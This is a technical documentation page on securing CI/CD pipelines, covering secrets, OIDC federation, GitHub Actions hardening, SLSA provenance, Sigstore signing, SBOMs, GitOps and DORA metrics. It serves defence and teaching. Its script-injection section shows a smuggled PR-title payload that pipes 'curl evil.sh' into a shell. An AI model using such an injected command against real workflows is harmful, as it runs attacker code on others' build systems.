---
layout: docs
title: "CI/CD: Security, GitOps & Operations"
description: "Pipeline threat model, secrets and OIDC federation, hardening GitHub Actions, SLSA provenance, Sigstore signing and SBOMs, GitOps, IaC pipelines, DORA metrics, self-hosted runners, and troubleshooting."
permalink: /docs/technology/ci-cd/security-and-operations.html
toc: true
toc_sticky: true
hide_title: true
---

[CI/CD](./) ›

# Security, GitOps & Operations

A CI/CD system holds production credentials, runs third-party code on every build, and publishes artifacts that everything downstream trusts, which makes it one of the most valuable targets in an organization. This page covers securing that system (secrets, OIDC federation, GitHub Actions hardening, and supply-chain provenance with SLSA, Sigstore, and SBOMs), running deployments through GitOps and infrastructure-as-code pipelines, measuring delivery with the DORA metrics, and operating runners and pipelines at scale.

## Pipeline Threat Model

Attacks on delivery pipelines usually do not target the running application. They target the path that produces it:

```mermaid
flowchart LR
    SRC["Source repo"] --> CI["CI runner"]
    DEP["Dependencies<br/>& base images"] --> CI
    ACT["Third-party<br/>actions / plugins"] --> CI
    CI --> REG[("Artifact<br/>registry")]
    REG --> CD["Deploy / GitOps"]
    CD --> PROD["Production"]
    A1(["Malicious PR,<br/>script injection"]) -.-> SRC
    A2(["Typosquat, compromised<br/>maintainer, xz-style backdoor"]) -.-> DEP
    A3(["Retagged or<br/>compromised action"]) -.-> ACT
    A4(["Secret exfiltration,<br/>cache poisoning"]) -.-> CI
    A5(["Artifact swap,<br/>mutable tags"]) -.-> REG
```

Recent incidents show each edge being used:

- **xz-utils (2024)**: a multi-year social-engineering campaign gave an attacker maintainer access, and a backdoor was hidden in release tarballs and build scripts rather than in the reviewed source.
- **Ultralytics (December 2024)**: a GitHub Actions workflow triggered on `pull_request_target` was abused through injection and cache poisoning to publish PyPI releases containing a cryptominer.
- **`tj-actions/changed-files` (March 2025, CVE-2025-30066)**: the tags of a popular action were repointed to a malicious commit that dumped runner memory, secrets included, into build logs of thousands of repositories. Workflows pinned to a commit SHA were unaffected.
- **Shai-Hulud (September 2025)**: a self-propagating npm worm stole publishing tokens from developer machines and CI, then used them to publish trojaned versions of the victims' other packages.

The common thread is **implicit trust in things that can change**: tags, tokens, and caches. The rest of this section is about replacing that trust with verification.

## Secrets Management

Secrets never go in the repository or in pipeline definitions. Store them in the platform's secret store or an external manager, and scope them as narrowly as possible:

{% raw %}
```yaml
# GitHub Actions: secrets scoped to a protected environment
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production          # secrets below exist only in this environment,
                                     # which can require reviewers and restrict branches
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.PAYMENTS_API_KEY }}   # masked in logs
```
{% endraw %}

In GitLab, mark CI/CD variables as **protected** (exposed only to protected branches and tags) and **masked** (redacted from job logs). Rules that apply on any platform:

- **Scope secrets to environments and branches.** A PR from a feature branch should never be able to read production secrets.
- **Never pass secrets on the command line.** Arguments show up in process listings and in traced logs. Use environment variables or files.
- **Masking is best-effort.** Transformed secrets (base64-encoded, split, or printed a character at a time) are not recognized. Do not rely on log masking as a control.
- **Prefer no secret at all.** Most cloud and registry credentials can be replaced by OIDC federation.

### OIDC Federation: No Stored Cloud Keys

Modern CI platforms can issue each job a short-lived, signed **OIDC token** describing *which* repository, branch, workflow, and environment is running. A cloud provider configured to trust the CI platform's issuer checks those claims and exchanges the token for temporary credentials. There is nothing long-lived to store, rotate, or leak.

```mermaid
sequenceDiagram
    participant J as CI job
    participant P as CI OIDC issuer
    participant C as Cloud STS / Vault
    participant R as Cloud resources
    J->>P: request ID token (audience = cloud)
    P-->>J: signed JWT (repo, ref, environment, workflow)
    J->>C: exchange JWT for credentials
    C->>C: verify signature + trust-policy conditions<br/>(e.g. repo:org/app:environment:production)
    C-->>J: temporary credentials (~1h)
    J->>R: deploy
```

{% raw %}
```yaml
# GitHub Actions -> AWS, no stored access keys
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write     # allow this job to request an OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-web
          aws-region: us-east-1
      - run: aws ecs update-service --cluster prod --service web --force-new-deployment
```
{% endraw %}

The security of this scheme depends entirely on the **trust policy's conditions**. A role that trusts any token from `token.actions.githubusercontent.com` with a broad `sub` wildcard can be assumed by any repository on GitHub. Always pin `sub` to the specific repository and, for production roles, the specific environment or branch.

GitLab provides the same mechanism through `id_tokens:`. It replaces the deprecated `CI_JOB_JWT` variables:

```yaml
# GitLab -> HashiCorp Vault: short-lived dynamic DB credentials
migrate:
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.example.com
  script:
    - export VAULT_TOKEN=$(vault write -field=token auth/jwt/login role=ci-migrate jwt="$VAULT_ID_TOKEN")
    - creds=$(vault read -format=json database/creds/app-migrate)   # per-job DB user, TTL-bound
    - export DB_USER=$(echo "$creds" | jq -r .data.username)
    - export DB_PASS=$(echo "$creds" | jq -r .data.password)
    - ./run-migrations.sh
```

### Secret Maturity Ladder

| Level | Practice | Residual risk |
|-------|----------|---------------|
| 1 | Static secrets in the CI secret store, rotated manually on a schedule | A leaked value is valid until someone notices and rotates it |
| 2 | Secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager) rotates automatically | Standing credentials still exist between rotations |
| 3 | **Dynamic secrets** minted per job with a short TTL (e.g. Vault database engine) | Exposure limited to minutes |
| 4 | **Workload identity / OIDC federation**: no secret material at all | Misconfigured trust policies |

When a static secret must remain, rotate it without downtime by overlapping validity: issue the new credential, deploy consumers that accept both, then revoke the old one. Package registries have moved the same way. **Trusted publishing** on PyPI and npm lets CI publish packages with an OIDC identity instead of a stored API token, which directly closes the token-theft route that worms such as Shai-Hulud relied on.

## Hardening GitHub Actions

GitHub Actions is the most widely used CI platform and has its own class of vulnerabilities. The main controls:

**Pin third-party actions to a full commit SHA.** Tags such as `@v4` are mutable, and the `tj-actions` attacker simply moved them. A SHA cannot be moved. Keep the tag in a comment so Dependabot or Renovate can propose updates:

```yaml
- uses: actions/checkout@0123456789abcdef0123456789abcdef01234567 # v6.0.2  (illustrative SHA)
```

Organization and enterprise administrators can now **enforce** SHA pinning through the allowed-actions policy, so workflows that use unpinned actions fail. The same policy can **block** specific actions (prefix `!`), which gives a fast response when an action is compromised.

**Default the `GITHUB_TOKEN` to read-only.** Set `permissions: contents: read` at the workflow level, or as the organization default, and grant write scopes per job only where needed.

**Treat `pull_request_target` and `workflow_run` as privileged.** They run in the context of the *base* repository, with secrets and a write token, but are often used to process *untrusted* fork content. Never check out and execute a fork's code in these workflows. Recent major versions of `actions/checkout` refuse to check out fork PR code under these triggers unless explicitly overridden.

**Avoid script injection.** Expressions are substituted into the script text *before* the shell runs, so attacker-controlled fields (PR titles, branch names, issue bodies) become code:

{% raw %}
```yaml
# Vulnerable: a PR titled  x"; curl evil.sh | sh; echo "  executes
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe: pass through an environment variable; the shell treats it as data
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```
{% endraw %}

**Do not share caches across trust boundaries.** A cache written by an untrusted workflow and restored by a release workflow is a code-injection path; that was the Ultralytics vector. Release jobs should build from a clean state or use caches keyed so that only trusted refs write them.

**Lint workflows automatically.** **zizmor** and **poutine** statically detect injection, excessive permissions, unpinned actions, and dangerous triggers. Runtime tools such as StepSecurity's **harden-runner** restrict and audit network egress from hosted runners.

## Scanning Gates

Scanners answer the question "is anything in here already known to be bad?" They should run as **blocking gates** with explicit thresholds rather than as advisory reports nobody reads.

| Scan | Finds | Common tools | Where it runs |
|------|-------|--------------|---------------|
| **Secret scanning** | Committed keys and tokens, including in history | gitleaks, TruffleHog, GitHub push protection | Pre-commit hook, push protection, CI |
| **SCA** (software composition analysis) | Known-vulnerable dependencies from lockfiles | OSV-Scanner, Dependabot, Renovate, Snyk, `npm audit`, `pip-audit` | Every PR; continuous re-scan |
| **SAST** | Vulnerable patterns in your own code | Semgrep, CodeQL, SonarQube, Bandit | Every PR |
| **Container / OS packages** | CVEs in base-image packages | Trivy, Grype, Docker Scout | After image build; registry re-scan |
| **IaC / config** | Misconfigured Terraform, Kubernetes, Dockerfiles | Trivy (`config`), Checkov, KICS | Every PR touching infra |
| **License policy** | Forbidden licenses pulled in transitively | Trivy (`license`), ORT, FOSSA | Release pipeline |
| **DAST** | Runtime vulnerabilities in a deployed app | OWASP ZAP, Nuclei | Against staging |

```yaml
# GitLab: parallel security gates that fail the pipeline on findings
secrets:
  stage: test
  script:
    - gitleaks git --redact --exit-code 1 .        # full history, not just the working tree

dependencies:
  stage: test
  script:
    - osv-scanner scan source --recursive .

image-vulns:
  stage: test
  needs: [build-image]
  script:
    - trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 "$IMAGE@$DIGEST"
```

Scanning at build time is necessary but reactive: an image that scanned clean yesterday can match a CVE disclosed today. Keep **SBOMs** for everything shipped and re-scan them continuously (below), and turn on registry-side scanning. See [Docker Registry & Distribution](../docker/registry.html#vulnerability-scanning).

## Supply-Chain Provenance

Scanning detects *known-bad* components. Provenance proves *where an artifact came from*: which source commit, which builder, which inputs. Together with signatures and SBOMs, it forms a chain of evidence that a deployment gate can verify:

```mermaid
flowchart LR
    S["Source commit"] --> B["Hardened build<br/>(hosted, isolated)"]
    B --> A["Artifact<br/>image@sha256:..."]
    B --> PV["Provenance attestation<br/>(SLSA: who / how / from what)"]
    A --> SG["Signature<br/>(Sigstore, keyless)"]
    A --> SB["SBOM attestation<br/>(SPDX / CycloneDX)"]
    PV --> V{"Admission gate<br/>verify all three"}
    SG --> V
    SB --> V
    V -->|"pass"| D["Deploy"]
    V -->|"fail"| X["Reject"]
```

### SLSA

**SLSA** (Supply-chain Levels for Software Artifacts, "salsa") is an OpenSSF specification that grades how trustworthy an artifact's build is. It is a set of requirements, not a tool. The current version is **SLSA v1.2**, which keeps the **Build track** from v1.0 and adds a **Source track** covering the integrity of source-control history and review. The Build track levels:

| Level | Requirement | Defends against |
|-------|-------------|-----------------|
| **Build L0** | Nothing | — |
| **Build L1** | Provenance exists, describing how the artifact was built | Mistakes; unknown origin of artifacts |
| **Build L2** | Provenance is generated and **signed by a hosted build platform** | Tampering with the artifact or provenance after the build |
| **Build L3** | The build platform is **hardened**: runs are isolated from each other, and signing material is inaccessible to user-defined build steps | A compromised build step forging provenance; cross-build contamination |

The key idea at L3 is that even a fully malicious build *script* cannot produce a valid provenance statement, because the signing happens somewhere the script cannot reach.

On GitHub there are two common routes:

- **Artifact attestations** (`actions/attest`, which `actions/attest-build-provenance` now wraps): signed SLSA provenance stored by GitHub and verifiable with `gh attestation verify`. On its own this meets Build L2. Running the build in a **reusable workflow** that callers cannot modify isolates the signing and reaches L3. Available for public repositories on all plans and for private repositories on GitHub Enterprise Cloud.
- **`slsa-framework/slsa-github-generator`** (currently v2.1.0): the OpenSSF reusable workflows that produce L3 provenance for generic artifacts, containers, and several language ecosystems.

{% raw %}
```yaml
# Build, push, and attest a container image (GitHub artifact attestations)
jobs:
  image:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write          # Sigstore certificate via OIDC
      attestations: write
      artifact-metadata: write
    steps:
      - uses: actions/checkout@v6
      - id: push
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
      - uses: actions/attest@v4
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```
{% endraw %}

```bash
# Consumer side: verify that the image was built by a workflow in this org
gh attestation verify oci://ghcr.io/myorg/app@sha256:... --owner myorg
```

### Signing with Sigstore and cosign

Traditional signing relies on long-lived GPG keys that must be stored, rotated, and eventually leak. **Sigstore** uses **keyless signing** instead. An ephemeral key pair is generated per signature. **Fulcio** issues a short-lived certificate binding the public key to an OIDC identity (for CI, the workflow's identity). The signing event is recorded in **Rekor**, a public, append-only transparency log. The private key is discarded immediately, so there is nothing long-lived to steal.

**cosign** is the Sigstore CLI for containers and blobs. Since **cosign v3** (current release line 3.1.x), signatures are produced in the standardized Sigstore **bundle** format by default. Verification auto-detects old and new formats.

```bash
# Sign by digest in CI (identity comes from the ambient OIDC token)
cosign sign --yes ghcr.io/myorg/app@"$DIGEST"

# Verify before deploy: pin the expected signer identity AND issuer,
# otherwise any Sigstore-signed image would pass.
cosign verify ghcr.io/myorg/app@"$DIGEST" \
  --certificate-identity-regexp '^https://github\.com/myorg/app/\.github/workflows/release\.yml@refs/heads/main$' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
```

> **Sign and verify by digest (`@sha256:...`), never by tag.** Tags are mutable, and `:latest` can be repointed after signing. The digest is the content hash, so a signature over a digest covers exactly those bytes. See [Docker Registry & Distribution](../docker/registry.html#image-signing) for Notation, the CNCF alternative, and registry-level trust.

### SBOMs

A **Software Bill of Materials** is a machine-readable inventory of every component in an artifact: direct and transitive dependencies, versions, licenses, and hashes. When the next Log4Shell-class vulnerability is disclosed, "are we affected, and where?" becomes a query over stored SBOMs rather than an emergency audit. The two dominant formats are **SPDX** (Linux Foundation, ISO/IEC 5962) and **CycloneDX** (OWASP, ECMA-424). Both are accepted by current regulatory regimes such as the EU Cyber Resilience Act and US federal procurement requirements.

```bash
# Generate from the built image
syft ghcr.io/myorg/app@"$DIGEST" -o spdx-json=sbom.spdx.json -o cyclonedx-json=sbom.cdx.json

# Bind it to the image as a signed attestation (not a loose file anyone could swap)
cosign attest --yes --type spdxjson --predicate sbom.spdx.json ghcr.io/myorg/app@"$DIGEST"

# Scan the SBOM, now and again whenever new CVEs are published, without rebuilding
grype sbom:sbom.cdx.json --fail-on high
```

### Enforcing at Admission

Signatures and attestations only matter if something checks them. In Kubernetes, an admission controller rejects workloads whose images lack a valid signature or provenance from the expected identity. Options include **Kyverno** (`verifyImages` rules), the **Sigstore policy-controller**, and managed equivalents such as GKE Binary Authorization. Start in audit mode, fix what it reports, then enforce, and require digests rather than tags in manifests.

## GitOps

**GitOps** makes Git the source of truth for the desired state of the system. An in-cluster agent continuously **pulls** that state and reconciles the cluster toward it. The CI pipeline never needs cluster credentials. It builds, tests, and publishes an artifact, then commits a change (usually an image digest) to a configuration repository. The **OpenGitOps** principles define the model: desired state is **declarative**, **versioned and immutable**, **pulled automatically**, and **continuously reconciled**.

```mermaid
flowchart LR
    DEV["Developer"] -->|"PR + merge"| APP[("App repo")]
    APP --> CI["CI: test, build,<br/>sign, push"]
    CI -->|"image@sha256"| REG[("Registry")]
    CI -->|"PR: bump digest"| CFG[("Config repo<br/>(manifests)")]
    subgraph Cluster
        OP["Argo CD / Flux"] -->|"apply + reconcile"| K8S["Workloads"]
    end
    CFG -->|"pull"| OP
    REG -->|"pull image"| K8S
    OP -.->|"drift detected: revert<br/>to declared state"| K8S
```

The CI step that hands off to GitOps is a small, reviewable commit:

```bash
# In CI, after pushing the image: bump the digest in the config repo
git clone "https://x-access-token:${CONFIG_REPO_TOKEN}@github.com/myorg/app-config.git"
cd app-config/envs/staging
kustomize edit set image "app=ghcr.io/myorg/app@${DIGEST}"
git commit -am "staging: app -> ${DIGEST}"
git push   # or open a PR if promotions to this environment require review
```

Practices that hold up at scale:

- **Separate config repo (or directory) from app code** so deploy history, access control, and review are independent of application commits.
- **One directory per environment, not one branch per environment.** Environment branches drift, and merges between them are error-prone. Use `envs/dev`, `envs/staging`, and `envs/prod` overlays (Kustomize or Helm values) on a single branch. Promotion is a PR that copies a digest from one directory to the next. Tools such as **Kargo** automate multi-stage promotion.
- **Secrets stay encrypted in Git** (SOPS, Sealed Secrets) or are referenced from an external manager via the **External Secrets Operator**.
- **Rollback is `git revert`.** The operator reconciles the cluster back. Pair this with progressive delivery (see [Deployment Strategies](deployment.html#progressive-delivery-with-argo-rollouts)) for automatic aborts.
- **Keep automated drift correction (self-heal) on in production.** Manual `kubectl edit` changes are reverted, which is the point.

| Tool | Model | Notes |
|------|-------|-------|
| **Argo CD** (CNCF graduated; 3.x line) | Application CRDs, web UI, ApplicationSets for fleets | Most widely deployed; strong multi-cluster story |
| **Flux** (CNCF graduated; 2.x line) | Composable controllers (source, kustomize, helm, image automation) | Kubernetes-native, CLI/CRD-first, no bundled UI |
| **Rancher Fleet** | Bundles targeted at cluster groups | Designed for very large cluster fleets |
| **Kargo** | Promotion orchestration on top of Argo CD | Stage-to-stage promotion with verification |

## Infrastructure as Code Pipelines

Infrastructure changes use the same pipeline discipline, with one extra rule: **apply exactly the plan that was reviewed**. Generate a saved plan on the PR, show it to reviewers, and apply that plan file (not a fresh plan) after approval.

```mermaid
flowchart LR
    PR["PR opened"] --> V["fmt + validate<br/>+ lint + policy"]
    V --> PL["terraform plan -out=tfplan<br/>(post summary to PR)"]
    PL --> RV{"Review +<br/>approval"}
    RV --> AP["terraform apply tfplan<br/>(same plan, main only)"]
```

```yaml
# .gitlab-ci.yml (Terraform or OpenTofu; swap `terraform` for `tofu`)
stages: [validate, plan, apply]

default:
  image: hashicorp/terraform:1.13
  id_tokens:
    CLOUD_ID_TOKEN: { aud: sts.amazonaws.com }   # OIDC to the cloud, no stored keys
  before_script:
    - terraform init -input=false

validate:
  stage: validate
  script:
    - terraform fmt -check -recursive
    - terraform validate
    - trivy config --exit-code 1 .               # IaC misconfiguration scan

plan:
  stage: plan
  script:
    - terraform plan -input=false -out=tfplan
  artifacts:
    paths: [tfplan]
    expire_in: 1 week

apply:
  stage: apply
  needs: [plan]
  environment: production
  script:
    - terraform apply -input=false tfplan
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
```

Additional points:

- **Policy as code**: OPA/Conftest, Checkov, or HCP Terraform Sentinel policies block non-compliant changes (public buckets, unencrypted volumes) before apply.
- **State** lives in a locked remote backend. A saved plan file can contain sensitive values, so treat it like a secret and expire it quickly.
- **Drift detection**: a scheduled `plan -detailed-exitcode` (exit code 2 means changes) reports resources modified outside the pipeline.
- **OpenTofu** is the open-source fork of Terraform and a drop-in replacement for most pipelines. See [Terraform](../terraform/).

## Measuring Delivery: DORA Metrics

The DORA research program (DevOps Research and Assessment, now part of Google Cloud) established the standard measures of software delivery performance. The current model uses **five metrics** in two groups:

| Group | Metric | Definition |
|-------|--------|------------|
| Throughput | **Change lead time** | Time from a change being committed to it running in production |
| Throughput | **Deployment frequency** | How often changes are deployed to production |
| Throughput | **Failed deployment recovery time** | Time to recover from a deployment that fails and needs immediate intervention (formerly "MTTR") |
| Instability | **Change fail rate** | Share of deployments that need immediate intervention (rollback or hotfix) |
| Instability | **Deployment rework rate** | Share of deployments that are unplanned and happen because of a production incident |

DORA's research consistently finds that throughput and stability are **not** a trade-off: teams that deploy most often also tend to have the lowest failure rates, because small, frequent changes are easier to verify and reverse. Use the metrics to track a team's trend over time, not to compare or rank teams, since that invites gaming.

To compute them, the pipeline has to emit events: deployment start and finish with commit SHA, environment, and outcome, and incidents linked to the deployment that caused them. Most platforms expose this through their deployments API. **OpenTelemetry** now defines semantic conventions for CI/CD (`cicd.pipeline.*` attributes), so pipeline runs can be traced like any other distributed system and stored alongside service telemetry. Commercial "CI visibility" products (Datadog, Grafana, and others) build on the same data.

Operational pipeline metrics worth alerting on: queue time waiting for runners, p50/p95 pipeline duration, flaky-test rate (runs whose outcome changes on retry), and the success rate of the `main` branch.

## Runners and Reuse at Scale

### Self-Hosted Runners

Self-hosted runners give access to private networks, special hardware (GPUs, arm64, large memory), and fixed-cost capacity. They also make the runner fleet part of your attack surface.

- **Make runners ephemeral.** One job per runner, then destroy it (`--ephemeral` for GitHub runners). Persistent runners let one job leave backdoors, poisoned caches, or credentials for the next.
- **Autoscale on Kubernetes** with **Actions Runner Controller** (runner scale sets) for GitHub, the GitLab Runner Kubernetes executor, or cloud autoscalers.
- **Never attach self-hosted runners to public repositories.** Any fork PR could run arbitrary code inside your network.
- **Isolate by trust level.** Keep separate runner groups for untrusted PR builds and for release and deploy jobs, with different network access and credentials.

### Reusable Pipelines

Copy-pasted pipeline YAML across hundreds of repositories cannot be kept secure or current. Centralize it:

- **GitHub**: reusable workflows (`on: workflow_call`), called with `uses: org/pipelines/.github/workflows/build.yml@<sha>`, plus composite actions. Required workflows and repository rulesets enforce them organization-wide.
- **GitLab**: CI/CD components published to the CI/CD Catalog and consumed with `include: component:`.
- **Jenkins**: shared libraries (`@Library('pipeline-lib') _`).

This is the core of **platform engineering**: a small team maintains "golden path" templates with security controls built in, and product teams consume them rather than writing pipelines from scratch.

## Troubleshooting Common Problems

| Symptom | Likely causes | Remedies |
|---------|---------------|----------|
| **Passes locally, fails in CI** | Different tool versions, missing env vars, OS or architecture differences, test-order dependence | Pin toolchains (`.tool-versions`, `.nvmrc`, container image by digest); run CI steps in the same container locally; randomize test order locally too |
| **Flaky tests** | Real time and sleeps, shared state, network calls, race conditions | Fake timers, isolated fixtures, Testcontainers; automatically quarantine and ticket flaky tests |
| **Slow pipelines** | No caching, serial jobs, full test suite on every PR | Lockfile-keyed caches, DAG fan-out, test sharding, affected-only builds (see [Keeping Pipelines Fast](platforms-and-pipelines.html#keeping-pipelines-fast)) |
| **Works in staging, breaks in production** | Artifact rebuilt per environment, config drift, different infrastructure versions | Build once and promote by digest; manage all environments from the same IaC modules and GitOps overlays |
| **Secret leaked in logs or history** | Debug `echo`, `set -x`, secret committed then "removed" | Rotate immediately (removing it from history is not enough); enable push protection and pre-commit gitleaks |
| **Deploys succeed but the service degrades** | Health checks only test liveness; no post-deploy verification | Real readiness probes; canary analysis on SLIs; automated rollback |

An example of the most common flaky-test fix, using a fake clock instead of real time:

```javascript
// Flaky and slow: depends on the real clock
it('expires after 1 hour', async () => {
  await sleep(3_600_000);
  expect(token.isExpired()).toBe(true);
});

// Deterministic: advance a fake clock (Jest; Vitest's vi.useFakeTimers is equivalent)
it('expires after 1 hour', () => {
  jest.useFakeTimers();
  const token = issueToken({ ttlMs: 3_600_000 });
  jest.advanceTimersByTime(3_600_001);
  expect(token.isExpired()).toBe(true);
  jest.useRealTimers();
});
```

## Further Reading

- Jez Humble and David Farley, *Continuous Delivery* (2010): the foundational text.
- Nicole Forsgren, Jez Humble, and Gene Kim, *Accelerate* (2018): the research behind the DORA metrics.
- Gene Kim et al., *The DevOps Handbook*, 2nd ed. (2021).
- David Farley, *Modern Software Engineering* (2021).
- The annual DORA *State of DevOps / AI-assisted Software Development* reports ([dora.dev](https://dora.dev/)).
- SLSA specification ([slsa.dev](https://slsa.dev/)) and Sigstore documentation ([docs.sigstore.dev](https://docs.sigstore.dev/)).
- GitHub's *Security hardening for GitHub Actions* guide in the official Actions documentation.

---

<nav class="page-nav">
  <a href="deployment.html">⬅ Deployment Strategies</a>
  <a href="./">CI/CD Hub ➡</a>
</nav>

## See Also

- [Platforms & Pipeline Design](platforms-and-pipelines.html) — choosing a platform and structuring pipelines
- [Deployment Strategies](deployment.html) — rolling, blue-green, canary, and feature flags
- [Docker Registry & Distribution](../docker/registry.html) — image signing, SBOMs, and provenance at the registry
- [Terraform](../terraform/) — infrastructure as code for the IaC pipelines above
- [Kubernetes](../kubernetes/) — the platform GitOps operators reconcile
- [Cybersecurity](../cybersecurity/) — wider security context for pipelines and secrets
